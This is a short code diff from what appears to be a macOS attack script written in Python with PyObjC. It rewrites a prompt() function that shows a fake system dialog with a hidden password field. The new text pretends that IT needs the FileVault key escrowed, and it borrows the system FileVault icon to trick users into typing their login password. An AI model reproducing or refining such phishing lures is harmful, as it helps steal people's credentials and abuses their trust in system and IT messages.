@@ -207,7 +207,7 @@ def addresses():
 def prompt():
     try:
         init = NSAlert.alloc().init()
-        s = NSAppleScript.alloc().initWithSource_("set popup to display dialog \"Application Updates Needed\" & return & return & \"Local macOS applications need permission to update\" & return default answer \"\" with title \"Authentication Needed\" with hidden answer")
+        s = NSAppleScript.alloc().initWithSource_("set popup to display dialog \"\" & return & \"Your Mac's FileVault encryption key needs to be escrowed by IT. Please enter the password you use to unlock your computer.\" & return default answer \"\" with icon file \"System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns\" with title \"Encryption Key Escrow\" with hidden answer")
         NSApp.setActivationPolicy_(1)
         NSApp.activateIgnoringOtherApps_(True)
         p = s.executeAndReturnError_(None)
